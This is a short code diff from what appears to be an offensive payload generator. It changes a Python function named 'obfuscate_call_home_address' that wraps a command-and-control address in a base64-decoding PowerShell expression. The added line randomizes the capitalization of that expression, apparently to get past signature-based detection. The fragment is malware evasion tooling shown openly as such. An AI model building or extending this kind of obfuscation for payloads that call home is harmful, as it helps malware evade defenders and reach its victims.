@@ -143,7 +143,7 @@ def random_string(length=-1, charset=string.ascii_letters):
     return random_string
 
 def obfuscate_call_home_address(c2address):
-     return'$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\'' + enc_powershell(c2address) +'\')))'
+     return'$('+randomize_capitalization('[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\'') + enc_powershell(c2address) +'\')))'
 
 def randomize_capitalization(data):
     """
